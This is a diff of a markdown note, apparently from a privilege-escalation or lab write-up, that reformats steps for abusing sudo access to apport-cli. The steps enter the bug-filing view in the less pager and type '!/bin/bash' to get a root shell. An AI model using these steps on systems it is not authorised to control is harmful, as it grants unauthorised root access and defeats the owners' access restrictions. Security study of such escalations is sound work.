@@ -10,16 +10,20 @@
 
 ## Steps:
 
- - sudo /usr/bin/apport-cli -v (Check version)
+#### 1) Check version
 
- - sudo /usr/bin/apport-cli --file-bug (Enter debug mode)
+    sudo /usr/bin/apport-cli -v 
 
- - Choose 1
+#### 2) Enter debug mode
 
- - Choose 2
+    sudo /usr/bin/apport-cli --file-bug 
 
- - Press V
+#### 3) Choose 1
 
- - Enter !/bin/bash to execute an elevated bash shell (Opens a less page as root)
+#### 4) Choose 2
 
- - PROFIT!
+#### 5) Press V
+
+#### 6) Enter !/bin/bash to execute an elevated bash shell (Opens a less page as root)
+
+#### 7) PROFIT!
